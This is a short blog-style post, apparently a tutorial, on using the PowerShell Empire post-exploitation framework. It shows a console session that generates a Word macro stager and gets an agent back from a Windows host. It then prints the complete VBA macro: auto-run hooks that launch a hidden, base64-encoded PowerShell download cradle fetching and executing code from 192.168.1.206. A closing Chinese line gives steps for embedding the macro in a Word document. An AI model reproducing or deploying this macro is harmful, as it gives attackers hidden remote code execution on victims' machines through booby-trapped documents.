---
title: Empire Usage
date: 2017-03-25 23:47:19
tags: Empire
---

**> python empire**

```
====================================================================================
 Empire: PowerShell post-exploitation agent | [Version]: 1.6.0
====================================================================================
 [Web]: https://www.PowerShellEmpire.com/ | [Twitter]: @harmj0y, @sixdub, @enigma0x3
====================================================================================

   _______ .___  ___. .______    __  .______       _______
  |   ____||   \/   | |   _  \  |  | |   _  \     |   ____|
  |  |__   |  \  /  | |  |_)  | |  | |  |_)  |    |  |__
  |   __|  |  |\/|  | |   ___/  |  | |      /     |   __|
  |  |____ |  |  |  | |  |      |  | |  |\  \----.|  |____
  |_______||__|  |__| | _|      |__| | _| `._____||_______|


       180 modules currently loaded

       1 listeners currently active

       0 agents currently active

(Empire) > listeners
[!] No listeners currently active
(Empire: listeners) > execute
(Empire: listeners) > usestager macro test
(Empire: stager/macro) > execute
[*] Stager output written out to: /tmp/macro

(Empire: stager/macro) > [+] Initial agent 1EBMCTEWVZDNM13U from 192.168.1.205 now active
(Empire: stager/macro) > agents

[*] Active agents:

  Name               Internal IP     Machine Name    Username            Process             Delay    Last Seen
  ---------          -----------     ------------    ---------           -------             -----    --------------------
  1EBMCTEWVZDNM13U   192.168.1.205   WIN             *WIN\hello         powershell/4272     5/0.0    2017-03-25 20:27:37
```
**> cat /tmp/macro**
```
Sub AutoOpen()
	Debugging
End Sub

Sub Document_Open()
	Debugging
End Sub

Public Function Debugging() As Variant
	Dim Str As String
	str = "powershell.exe -NoP -sta -NonI -W Hidden -Enc WwBT"
	str = str + "AFkAcwB0AGUAbQAuAE4ARQB0AC4AUwBFAFIAVgBpAGMARQBQAG"
	str = str + "8ASQBOAHQATQBBAE4AQQBnAGUAUgBdADoAOgBFAHgAUABFAEMA"
	str = str + "VAAxADAAMABDAG8AbgB0AEkATgBVAEUAIAA9ACAAMAA7ACQAVw"
	str = str + "BDAD0ATgBFAFcALQBPAGIASgBlAGMAdAAgAFMAWQBzAHQARQBN"
	str = str + "AC4ATgBFAFQALgBXAGUAYgBDAGwAaQBlAE4AdAA7ACQAdQA9AC"
	str = str + "cATQBvAHoAaQBsAGwAYQAvADUALgAwACAAKABXAGkAbgBkAG8A"
	str = str + "dwBzACAATgBUACAANgAuADEAOwAgAFcATwBXADYANAA7ACAAVA"
	str = str + "ByAGkAZABlAG4AdAAvADcALgAwADsAIAByAHYAOgAxADEALgAw"
	str = str + "ACkAIABsAGkAawBlACAARwBlAGMAawBvACcAOwAkAFcAYwAuAE"
	str = str + "gARQBBAGQAZQBSAFMALgBBAGQAZAAoACcAVQBzAGUAcgAtAEEA"
	str = str + "ZwBlAG4AdAAnACwAJAB1ACkAOwAkAFcAYwAuAFAAcgBPAFgAeQ"
	str = str + "AgAD0AIABbAFMAWQBTAFQARQBNAC4ATgBlAFQALgBXAEUAYgBS"
	str = str + "AEUAUQBVAGUAUwB0AF0AOgA6AEQARQBmAEEAdQBMAHQAVwBlAE"
	str = str + "IAUAByAE8AeAB5ADsAJAB3AGMALgBQAHIATwB4AHkALgBDAHIA"
	str = str + "ZQBkAEUATgB0AEkAYQBsAFMAIAA9ACAAWwBTAHkAUwBUAGUATQ"
	str = str + "AuAE4AZQBUAC4AQwBSAGUARABFAE4AVABJAEEATABDAEEAQwBo"
	str = str + "AGUAXQA6ADoARABlAEYAYQBVAEwAdABOAGUAdAB3AE8AcgBLAE"
	str = str + "MAcgBlAEQAZQBOAFQAaQBhAEwAUwA7ACQASwA9ACcAVABFAGMA"
	str = str + "ewBZAEAAXgBMAEkASgB4AFYAZwAxAHAAWgBhADIAVQAzAEYAaQ"
	str = str + "BOAEgAXQBgAD8AcgBCAHUAJQAqACcAOwAkAGkAPQAwADsAWwBj"
	str = str + "AEgAQQBSAFsAXQBdACQAQgA9ACgAWwBjAEgAQQBSAFsAXQBdAC"
	str = str + "gAJAB3AGMALgBEAE8AVwBOAEwAbwBhAGQAUwBUAFIASQBuAGcA"
	str = str + "KAAiAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALg"
	str = str + "AyADAANgA6ADgAMAA4ADAALwBpAG4AZABlAHgALgBhAHMAcAAi"
	str = str + "ACkAKQApAHwAJQB7ACQAXwAtAGIAWABPAHIAJABrAFsAJABJAC"
	str = str + "sAKwAlACQAawAuAEwARQBOAEcAdABIAF0AfQA7AEkARQBYACAA"
	str = str + "KAAkAEIALQBKAE8ASQBuACcAJwApAA=="
	Const HIDDEN_WINDOW = 0
	strComputer = "."
	Set objWMIService = GetObject("winmgmts:\\" & strComputer & "\root\cimv2")
	Set objStartup = objWMIService.Get("Win32_ProcessStartup")
	Set objConfig = objStartup.SpawnInstance_
	objConfig.ShowWindow = HIDDEN_WINDOW
	Set objProcess = GetObject("winmgmts:\\" & strComputer & "\root\cimv2:Win32_Process")
	objProcess.Create str, Null, objConfig, intProcessID
End Function
```
打开Word>>视图>>宏>>查看宏>>输入宏名>>创建>>输入macro中内容>>保存